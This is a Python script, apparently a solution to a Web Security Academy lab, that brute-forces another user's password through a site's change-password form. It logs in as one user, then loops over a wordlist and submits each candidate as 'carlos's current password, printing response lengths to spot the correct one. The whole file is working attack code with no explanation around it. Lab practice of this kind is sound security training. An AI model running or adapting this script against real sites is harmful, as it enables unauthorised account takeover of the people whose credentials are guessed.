import requests


for i in open('/home/ocean/tools/wordlists/passwords'):
	session = requests.session()
	burp0_url = "https://0a9a00690411cd60c06fc78d007e002c.web-security-academy.net:443/login"
	burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://0a9a00690411cd60c06fc78d007e002c.web-security-academy.net/login", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://0a9a00690411cd60c06fc78d007e002c.web-security-academy.net", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Te": "trailers", "Connection": "close"}
	burp0_data = {"username": "wiener", "password": "qwer"}
	session.post(burp0_url, headers=burp0_headers, data=burp0_data)

	burp1_url = "https://0a9a00690411cd60c06fc78d007e002c.web-security-academy.net:443/my-account/change-password"
	burp1_cookies = {"session": "iekyIKdjdikqDpQdKfQVJc6IbZax8pta"}
	burp1_headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://0a9a00690411cd60c06fc78d007e002c.web-security-academy.net/my-account", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://0a9a00690411cd60c06fc78d007e002c.web-security-academy.net", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Te": "trailers", "Connection": "close"}
	burp1_data = {"username": "carlos", "current-password": i.strip(), "new-password-1": "qwer", "new-password-2": "qwer"}
	res = session.post(burp1_url, headers=burp1_headers, cookies=burp1_cookies, data=burp1_data)
	print(i.strip() + " " + str(len(res.text)))
	session.close()